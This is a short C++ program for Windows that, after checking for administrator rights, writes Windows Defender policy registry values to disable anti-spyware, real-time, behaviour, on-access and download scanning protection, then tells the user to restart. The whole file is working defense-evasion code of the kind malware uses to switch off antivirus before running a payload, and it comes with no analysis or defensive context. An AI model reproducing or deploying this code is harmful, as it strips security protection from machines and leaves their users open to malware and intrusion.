#include <windows.h>
#include <stdio.h>
#include <iostream>

using namespace std;

bool isUserAdmin() {
    BOOL isAdmin = FALSE;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    PSID AdministratorsGroup;

    if (!AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0,&AdministratorsGroup)) {
      return false;
    }
    if (!CheckTokenMembership(NULL, AdministratorsGroup, &isAdmin)) {
        FreeSid(AdministratorsGroup);
        return false;
    }
    FreeSid(AdministratorsGroup);
    return isAdmin != FALSE;
}

// disable defender via registry
int main(int argc, char* argv[]) {
    HKEY key;
    HKEY new_key;
    DWORD disable = 1;

    if (!isUserAdmin()) {
      cout << "please run this program as administrator." << endl;
      return -1;
    }

    LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender", 0, KEY_ALL_ACCESS, &key);
    if (res == ERROR_SUCCESS) {
      RegSetValueEx(key, "DisableAntiSpyware", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
      RegCreateKeyEx(key, "Real-Time Protection", 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, 0, &new_key, 0);
      RegSetValueEx(new_key, "DisableRealtimeMonitoring", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
      RegSetValueEx(new_key, "DisableBehaviorMonitoring", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
      RegSetValueEx(new_key, "DisableScanOnRealtimeEnable", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
      RegSetValueEx(new_key, "DisableOnAccessProtection", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
      RegSetValueEx(new_key, "DisableIOAVProtection", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));

      RegCloseKey(key);
      RegCloseKey(new_key);
    }

    cout << "Windows Defender has been disabled." << endl;
    cout << "Please restart your computer to take effect." << endl;
    getchar();
    return 0;
}